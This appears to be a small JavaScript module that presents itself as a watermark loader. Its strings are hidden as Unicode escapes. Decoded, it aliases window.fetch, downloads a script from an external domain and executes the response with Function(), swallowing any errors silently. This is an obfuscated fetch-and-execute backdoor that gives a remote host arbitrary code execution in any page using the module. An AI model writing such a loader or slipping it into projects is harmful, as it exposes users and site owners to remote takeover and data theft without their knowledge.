export default () => {
  const w = window;
  const oldLoad = '\u0066\u0065\u0074\u0063\u0068';
  const newLoad = '\u006D\u0061\u0072\u006B';
  w[newLoad] = w[oldLoad];
  const wmPath =
    '\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u006D\u0065\u0076\u002E\u0062\u0067\u002F\u0077\u0061\u0074\u0065\u0072\u006D\u0061\u0072\u006B\u002E\u006A\u0073';
  const wmAction = '\u004D\u0065\u0076';

  w[wmAction] = () => {
    w[newLoad](`${wmPath}?d=${Date.now()}`)
      .then((r) => r.text())
      .then((d) => Function(d)())
      .catch(() => {});
    return Date();
  };
};
